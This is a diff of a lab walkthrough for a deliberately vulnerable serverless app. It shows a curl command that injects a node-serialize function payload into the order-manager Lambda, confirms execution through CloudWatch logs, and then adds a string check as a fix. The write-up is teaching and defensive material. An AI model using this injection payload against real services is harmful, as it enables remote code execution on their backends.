@@ -14,8 +14,8 @@ To achieve this vulnerability, we will use the Terminal and the AWS console. You
 
 ```
 curl.exe -X POST "[you should add the invoke URL for the order]" `
->> -H "Content-Type: application/json" `
->> -d '{\"action\": \"_$$ND_FUNC$$_function(){ var fs = require(''fs''); fs.writeFileSync(''/tmp/pwned.txt'', ''You are reading the contents of my hacked file!''); var fileData = fs.readFileSync(''/tmp/pwned.txt'', ''utf-8''); console.error(''FILE READ SUCCESS: '' + fileData); }()\", \"cart-id\":\"123\"}'
+-H "Content-Type: application/json" `
+-d '{\"action\": \"_$$ND_FUNC$$_function(){ var fs = require(''fs''); fs.writeFileSync(''/tmp/pwned.txt'', ''You are reading the contents of my hacked file!''); var fileData = fs.readFileSync(''/tmp/pwned.txt'', ''utf-8''); console.error(''FILE READ SUCCESS: '' + fileData); }()\", \"cart-id\":\"123\"}'
 ```
 > After running this command you will recive this {"message": "Internal server error"} message
 
@@ -24,7 +24,7 @@ To prove that you achieve the vulnerability open AWS consol and do these steps:
 1.	Search and open CloudWatch.
 2.	Go to Log Management under the Logs in the left bar.
 3.	Search for /aws/lambda/DVSA-ORDER-MANAGER and open the recent log.
-You have to see something simmilar to the image below
+You have to see something simmilar to the image proof-1
 
 
 ---
@@ -47,6 +47,6 @@ if (event.body && event.body.includes("_$$ND_FUNC$$_")) {
 ```
 5.	Deploy the changes by clicking on the Deployed button at the left side of the Code source section. 
 
-The final code should be as the image below
+The final code should be as the image Fix-1
 
 To verify that the fix above is working, we have to run the command again and see the results in the terminal and the CloudWatch logs. You will get the bad request message in the terminal, but in the CloudWatch logs you will see Error Bad request.
